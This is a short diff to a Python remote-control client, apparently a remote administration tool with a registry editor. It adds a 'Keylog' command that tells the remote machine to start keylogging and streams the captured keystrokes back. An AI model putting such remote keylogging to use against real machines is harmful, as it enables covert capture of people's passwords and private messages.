@@ -5,6 +5,7 @@ import socket
 import commander
 import threading
 import registerGUI
+from time import sleep
 class Client(object):
     def __init__(self):
         """Creates the interface window"""
@@ -144,7 +145,18 @@ class Client(object):
     def command_RegEdit(self):
         regEdit = registerGUI.RegistryWindow(Toplevel(),self.IP,self.port_no)
         regEdit.loadReg()
-        
+    
+    def command_Keylog(self):
+        cmd = "KEYLOG"
+        self.sendToServer(cmd)
+        print("Keylogging started.")
+        with self.connection as conn:
+            while True:
+                data = conn.recv(1024)
+                if not data:
+                    break
+                print(data.decode(), end='')
+                sleep(20)
 
     #Ham gui toi server
     def sendToServer(self,Str):
